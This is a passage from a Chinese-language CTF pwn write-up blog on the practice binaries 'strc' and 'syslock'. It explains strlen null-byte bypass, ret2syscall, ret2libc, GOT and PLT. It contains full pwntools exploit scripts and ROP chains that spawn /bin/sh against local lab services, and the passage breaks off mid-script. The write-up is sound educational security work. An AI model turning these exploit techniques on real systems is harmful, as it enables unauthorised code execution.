class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)len &gt; <span class="number">0x18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Oh,too much.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(str, <span class="string">&quot;meow&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, str, n);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">strncpy</span>(dest, str, n);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re right.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>checksec分析：</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./strc</span>   </span><br><span class="line">[*] &#x27;/home/kali/CTF_Scripts/Practice/strc&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure></div>

<p>无canary，依旧是ret2text，但是包含了<strong>绕过字符串检查</strong>的考点</p>
<h3 id="how-to-bypass-string-checking"><a href="#how-to-bypass-string-checking" class="headerlink" title="how to bypass string checking"></a>how to bypass string checking</h3><h4 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h4><p>这是<strong>检验字符串长度</strong>的函数，常见的形式是”当字符串个数＞number时，失败”，绕过它其实很简单，在<strong>输出的字符串开头加上’\x00’</strong>，这样strlen就不会检测后续字符串的个数了，就完成了绕过</p>
<h4 id="strncmp"><a href="#strncmp" class="headerlink" title="strncmp"></a>strncmp</h4><p>指定比较size个字符串，有三个参数。前一二为比较的字符串，第三个参数为size</p>
<p><code>strncmp(string1,string2,size)</code></p>
<h5 id="比较规则"><a href="#比较规则" class="headerlink" title="比较规则"></a>比较规则</h5><table>
<thead>
<tr>
<th><strong>返回值</strong></th>
<th><strong>含义</strong></th>
<th><strong>内存示例 (n&#x3D;4)</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>前n字节完全相同</td>
<td>“flag” vs “flag”</td>
</tr>
<tr>
<td>&lt;0</td>
<td>str1 &lt; str2 (字典序)</td>
<td>“abcd” vs “bbcd”</td>
</tr>
<tr>
<td>&gt;0</td>
<td>str1 &gt; str2 (字典序)</td>
<td>“cat\x00” vs “cat” (n&#x3D;4)</td>
</tr>
</tbody></table>
<h5 id="常见样式"><a href="#常见样式" class="headerlink" title="常见样式"></a>常见样式</h5><p><code>！strcmp(&amp;buf[j],&quot;flag&quot;/&quot;cat&quot;....,size)</code></p>
<p>这样的格式可以理解为”过滤”，这些字符串都不能用，如果用了这些字符串，就很有可能退出运行（如果该函数是这么定义的话）</p>
<h3 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;./strc&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./strc&#x27;</span>)</span><br><span class="line">backdoor_addr = elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找ret指令用于栈对齐</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">ret_gadget = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Backdoor address: <span class="subst">&#123;<span class="built_in">hex</span>(backdoor_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;Ret gadget: <span class="subst">&#123;<span class="built_in">hex</span>(ret_gadget)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">39959</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建payload（考虑栈对齐）</span></span><br><span class="line">payload = <span class="string">b&quot;meow&quot;</span> + <span class="string">b&quot;A&quot;</span>*<span class="number">19</span>   <span class="comment"># 23 bytes (4+19)</span></span><br><span class="line">payload += <span class="string">b&quot;\x00&quot;</span>             <span class="comment"># Null byte at offset 23 (strlen=23)</span></span><br><span class="line"><span class="comment">#使用\x00来绕过strlen的检查</span></span><br><span class="line">payload += <span class="string">b&quot;B&quot;</span>*<span class="number">8</span>              <span class="comment"># Overwrite &#x27;n&#x27; variable</span></span><br><span class="line">payload += <span class="string">b&quot;C&quot;</span>*<span class="number">8</span>              <span class="comment"># Overwrite saved RBP</span></span><br><span class="line">payload += p64(ret_gadget)     <span class="comment"># Stack alignment</span></span><br><span class="line">payload += p64(backdoor_addr)  <span class="comment"># Target function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) == <span class="number">56</span>, <span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&quot;</span></span><br><span class="line"><span class="comment">#声明&quot;合法&quot;长度绕过二次检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;What can u say?&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;So,what size is it?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())  <span class="comment"># Copy 56 bytes</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="syslock"><a href="#syslock" class="headerlink" title="syslock"></a>syslock</h2><p><strong>IDA分析：</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;My lock looks strange—can you help me?\n&quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;choose mode\n&quot;</span>, <span class="number">0xC</span>uLL);</span><br><span class="line">    i = input();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">4</span> )</span><br><span class="line">        lose();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Input your password\n&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;s + i, <span class="number">0xC</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">59</span> )</span><br><span class="line">        lose();</span><br><span class="line">    cheat();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">cheat</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Developer Mode.\n&quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>checksec分析：</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./syslock</span></span><br><span class="line">[*] &#x27;/home/kali/CTF_Scripts/Practice/syslock&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure></div>

<p>无canary和pie，但是没有后门函数了，而且开启了NX保护，<del>所以这里的考点是~~~~<strong>ret2syscall</strong></del><strong>，<strong>后面综合分析得到ret2syscall不可行，最主要的原因是没有<code>syscall;ret</code>这一gadget，所以这里需要使用</strong>ret2libc</strong></p>
<h3 id="what-is-ret2syscall"><a href="#what-is-ret2syscall" class="headerlink" title="what is ret2syscall?"></a><strong>what is ret2syscall?</strong></h3><p><code>**ret2syscall**</code>（Return-to-syscall）是一种<strong>二进制漏洞利用技术</strong>，属于更广泛的ROP（Return-Oriented Programming）攻击的一种具体形式。它的核心目标是：<strong>在无法直接执行栈上的恶意代码（例如，由于NX&#x2F;DEP保护开启）的情况下，通过精心构造ROP链，直接调用操作系统的系统调用（syscall）来获取一个shell</strong>。</p>
<h3 id="how-to-solve-a-ret2syscall-problem"><a href="#how-to-solve-a-ret2syscall-problem" class="headerlink" title="how to solve a ret2syscall problem?"></a>how to solve a ret2syscall problem?</h3><h4 id="通用步骤："><a href="#通用步骤：" class="headerlink" title="通用步骤："></a>通用步骤：</h4><ol>
<li><strong>定位漏洞点</strong><br>发现栈溢出漏洞（如 <code>**gets()**</code>、<code>**scanf()**</code>）或其他能劫持 <strong>EIP&#x2F;RIP</strong> 的漏洞。</li>
<li><strong>搜索关键组件</strong><br>使用工具（<code>**ROPgadget**</code>、<code>**ropper**</code>、<code>**pwntools**</code>）查找：<ul>
<li>系统调用指令（<code>**int 0x80**</code>&#x2F;<code>**syscall**</code>）</li>
<li>寄存器控制 Gadgets（<code>**pop &lt;寄存器&gt;; ret;**</code>）</li>
<li><code>**/bin/sh**</code>** 字符串地址**（或在可写内存中构造）</li>
</ul>
</li>
<li><strong>构建 ROP 链</strong><br>按系统调用要求设置寄存器值，触发系统调用。</li>
<li><strong>组装攻击载荷</strong></li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[填充字节] + [Gadget地址 + 参数值] + [系统调用触发指令地址]</span><br></pre></td></tr></table></figure></div>

<h4 id="32位系统-1"><a href="#32位系统-1" class="headerlink" title="32位系统"></a>32位系统</h4><p><strong>系统调用指令</strong>：<code>**int 0x80**</code><br><strong>参数寄存器</strong>：</p>
<ul>
<li><code>**eax**</code> &#x3D; 系统调用号</li>
<li><code>**ebx**</code> &#x3D; 第一参数</li>
<li><code>**ecx**</code> &#x3D; 第二参数</li>
<li><code>**edx**</code> &#x3D; 第三参数</li>
</ul>
<h5 id="以-execve-bin-sh-0-0-获取-shell-为例："><a href="#以-execve-bin-sh-0-0-获取-shell-为例：" class="headerlink" title="以 **execve(&quot;/bin/sh&quot;, 0, 0)** 获取 shell 为例："></a>以 <code>**execve(&quot;/bin/sh&quot;, 0, 0)**</code> 获取 shell 为例：</h5><table>
<thead>
<tr>
<th><strong>目标</strong></th>
<th><strong>值</strong></th>
<th><strong>所需 Gadget</strong></th>
</tr>
</thead>
<tbody><tr>
<td>系统调用号</td>
<td><code>**eax = 0x0b**</code></td>
<td><code>**pop eax; ret**</code></td>
</tr>
<tr>
<td>参数1</td>
<td><code>**ebx = &lt;地址&gt;**</code></td>
<td><code>**pop ebx; ret**</code></td>
</tr>
<tr>
<td>参数2</td>
<td><code>**ecx = 0**</code></td>
<td><code>**pop ecx; ret**</code></td>
</tr>
<tr>
<td>参数3</td>
<td><code>**edx = 0**</code></td>
<td><code>**pop edx; ret**</code></td>
</tr>
<tr>
<td>触发调用</td>
<td><code>**int 0x80**</code></td>
<td><code>**int 0x80; ret**</code></td>
</tr>
</tbody></table>
<p><strong>攻击载荷结构</strong>（栈空间从低到高）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">偏移填充字节 * n</span><br><span class="line">pop_eax地址     # 弹出下一个值到 eax</span><br><span class="line">0x0b            # execve 系统调用号 (11)</span><br><span class="line">pop_ebx地址</span><br><span class="line">bin_sh地址      # &quot;/bin/sh&quot; 字符串地址</span><br><span class="line">pop_ecx地址</span><br><span class="line">0x0             # NULL (argv)</span><br><span class="line">pop_edx地址</span><br><span class="line">0x0             # NULL (envp)</span><br><span class="line">int_0x80地址    # 触发系统调用</span><br></pre></td></tr></table></figure></div>

<h4 id="64位系统-1"><a href="#64位系统-1" class="headerlink" title="64位系统"></a>64位系统</h4><p><strong>系统调用指令</strong>：<code>**syscall**</code><br><strong>参数寄存器</strong>：</p>
<ul>
<li><code>**rax**</code> &#x3D; 系统调用号</li>
<li><code>**rdi**</code> &#x3D; 第一参数</li>
<li><code>**rsi**</code> &#x3D; 第二参数</li>
<li><code>**rdx**</code> &#x3D; 第三参数</li>
</ul>
<h5 id="以-execve-bin-sh-0-0-获取-shell-为例：-1"><a href="#以-execve-bin-sh-0-0-获取-shell-为例：-1" class="headerlink" title="以 **execve(&quot;/bin/sh&quot;, 0, 0)** 获取 shell 为例："></a>以 <code>**execve(&quot;/bin/sh&quot;, 0, 0)**</code> 获取 shell 为例：</h5><table>
<thead>
<tr>
<th><strong>目标</strong></th>
<th><strong>值</strong></th>
<th><strong>所需 Gadget</strong></th>
</tr>
</thead>
<tbody><tr>
<td>系统调用号</td>
<td><code>**rax = 0x3b**</code></td>
<td><code>**pop rax; ret**</code></td>
</tr>
<tr>
<td>参数1</td>
<td><code>**rdi = &lt;地址&gt;**</code></td>
<td><code>**pop rdi; ret**</code></td>
</tr>
<tr>
<td>参数2</td>
<td><code>**rsi = 0**</code></td>
<td><code>**pop rsi; ret**</code></td>
</tr>
<tr>
<td>参数3</td>
<td><code>**rdx = 0**</code></td>
<td><code>**pop rdx; ret**</code></td>
</tr>
<tr>
<td>触发调用</td>
<td><code>**syscall**</code></td>
<td><code>**syscall; ret**</code></td>
</tr>
</tbody></table>
<p><strong>攻击载荷结构</strong>（栈空间从低到高）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">偏移填充字节 * n</span><br><span class="line">pop_rdi地址</span><br><span class="line">bin_sh地址      # &quot;/bin/sh&quot; 字符串地址</span><br><span class="line">pop_rsi地址</span><br><span class="line">0x0             # NULL (argv)</span><br><span class="line">pop_rdx地址</span><br><span class="line">0x0             # NULL (envp)</span><br><span class="line">pop_rax地址</span><br><span class="line">0x3b            # execve 系统调用号 (59)</span><br><span class="line">syscall地址     # 触发系统调用</span><br></pre></td></tr></table></figure></div>



<h3 id="what-is-ret2libc"><a href="#what-is-ret2libc" class="headerlink" title="what is ret2libc?"></a>what is ret2libc?</h3><p><code>**ret2libc**</code> (Return-to-libc) 是一种利用软件漏洞（通常是栈溢出）进行攻击的技术。其核心思想是<strong>劫持程序的执行流程，使其跳转到目标系统动态链接库 <strong><code>**libc**</code></strong> 中的特定函数（如 <strong><code>**system()**</code></strong>）去执行</strong>，而不是注入并执行攻击者自己的 Shellcode。</p>
<h3 id="what-is-GOT"><a href="#what-is-GOT" class="headerlink" title="what is GOT?"></a>what is GOT?</h3><p>当程序使用共享库（如 <code>**libc.so**</code>）时，库代码在<strong>程序加载时</strong>或<strong>运行时</strong>才被加载到内存中。库函数的<strong>绝对内存地址</strong>在编译时是<strong>未知</strong>的，并且由于 ASLR（地址空间布局随机化），每次程序运行时这些地址都会<strong>改变</strong>。</p>
<p>那么，程序如何调用这些地址未知且会变化的函数（如 <code>**printf**</code>, <code>**system**</code>）呢？这就是 GOT（和它的搭档 PLT）要解决的核心问题。</p>
<p><strong>位置：</strong> GOT 是位于程序<strong>数据段（</strong><code>**.data**</code>** 或 <strong><code>**.got**</code></strong> 节）** 中的一个<strong>表（数组）</strong>。</p>
<p><strong>内容：</strong> GOT 中的每个条目（entry）存储着一个<strong>地址</strong>。这个地址可以是：</p>
<ul>
<li><strong>最终目标地址：</strong> 对于已经解析过的函数，GOT 条目存储的就是该函数在<strong>当前加载的共享库（如 <strong><code>**libc**</code></strong>）中的实际运行时地址</strong>。</li>
<li><strong>跳板地址：</strong> 对于<strong>尚未被调用过</strong>的函数，GOT 条目存储的是一个指向<strong>延迟绑定解析器</strong>的地址（通常是 PLT 中对应条目代码的下一条指令地址，即 <code>**PLT[x]+6**</code>）。<strong>可写性：</strong> 关键点在于，GOT 所在的<strong>数据段是可写的（Writeable）</strong>。这使得动态链接器 (<code>**ld-linux.so**</code>) 能够在程序运行时，在函数第一次被调用时，将函数的真实地址<strong>写入</strong>到对应的 GOT 条目中（这个过程称为”绑定”或”解析”）。</li>
</ul>
<p><strong>与 PLT 的关系：</strong> GOT 几乎总是和 <strong>PLT（Procedure Linkage Table，过程链接表）</strong> 协同工作。PLT 位于代码段（<code>**.text**</code> 或 <code>**.plt**</code> 节），通常是<strong>不可写的（但可执行）</strong>。</p>
<h3 id="what-is-PLT"><a href="#what-is-PLT" class="headerlink" title="what is PLT?"></a>what is PLT?</h3><p><strong>PLT（Procedure Linkage Table，过程链接表）</strong> 是程序动态链接的核心组件之一，与 <strong>GOT（Global Offset Table，全局偏移表）</strong> 协同工作，解决<strong>共享库函数的延迟绑定（Lazy Binding）<strong>问题。它位于程序的 <strong>代码段（</strong><code>**.text**</code></strong> 或 <strong><code>**.plt**</code></strong> 节）</strong>，通常是<strong>只读且可执行</strong>的。</p>
<h3 id="脚本解析："><a href="#脚本解析：" class="headerlink" title="脚本解析："></a>脚本解析：</h3><p>这里给出错误的ret2syscall脚本尝试和正确的ret2libc的脚本：</p>
<h4 id="ret2syscall："><a href="#ret2syscall：" class="headerlink" title="ret2syscall："></a>ret2syscall：</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定地址</span></span><br><span class="line">pop_rdi_rsi_rdx = <span class="number">0x401240</span>   <span class="comment"># pop rdi; pop rsi; pop rdx; ret</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401244</span>        <span class="comment"># pop rax; ret</span></span><br><span class="line">syscall_addr = <span class="number">0x401230</span>       <span class="comment"># syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这里是最主要的问题，由于没有可供使用的syscall;ret片段，</span></span><br><span class="line"><span class="string">系统调用执行后会直接回到lose函数，这就导致不能正确进行第二次系统调用</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">data_addr = <span class="number">0x404028</span>          <span class="comment"># .data段地址</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span>           <span class="comment"># 通用ret用于栈对齐</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./syslock&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步：进入开发者模式</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;choose mode\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;-32&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input your password\n&quot;</span>)</span><br><span class="line">p.send(p32(<span class="number">59</span>) + <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)  <span class="comment"># 覆盖i为59</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Developer Mode.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义内存布局</span></span><br><span class="line">string_addr = data_addr        <span class="comment"># 字符串地址</span></span><br><span class="line">argv_array_addr = data_addr + <span class="number">8</span>  <span class="comment"># 参数数组地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：构造ROP链</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(ret_addr)  <span class="comment"># 初始对齐</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一阶段：read(0, data_addr, 24)</span></span><br><span class="line"><span class="comment"># 读取 /bin/sh\x00 + 指针 + NULL</span></span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)</span><br><span class="line">payload += p64(<span class="number">0</span>)                   <span class="comment"># rdi = stdin</span></span><br><span class="line">payload += p64(data_addr)           <span class="comment"># rsi = 目标地址</span></span><br><span class="line">payload += p64(<span class="number">24</span>)                   <span class="comment"># rdx = 长度</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)                   <span class="comment"># rax = read</span></span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对齐后执行 execve</span></span><br><span class="line">payload += p64(ret_addr)            <span class="comment"># 再次对齐</span></span><br><span class="line">payload += p64(pop_rdi_rsi_rdx)</span><br><span class="line">payload += p64(string_addr)         <span class="comment"># rdi = 字符串地址</span></span><br><span class="line">payload += p64(argv_array_addr)     <span class="comment"># rsi = 参数数组地址</span></span><br><span class="line">payload += p64(<span class="number">0</span>)                   <span class="comment"># rdx = 0</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">59</span>)                  <span class="comment"># rax = 59</span></span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加GDB调试</span></span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *0x401230\nc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.clean()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送字符串+指针+NULL</span></span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(string_addr) + p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h4 id="ret2libc："><a href="#ret2libc：" class="headerlink" title="ret2libc："></a>ret2libc：</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动远程连接</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">36713</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ret2libc&#x27;)  # 本地测试选项</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第一阶段：泄露 read@plt 并计算程序基址 =====</span></span><br><span 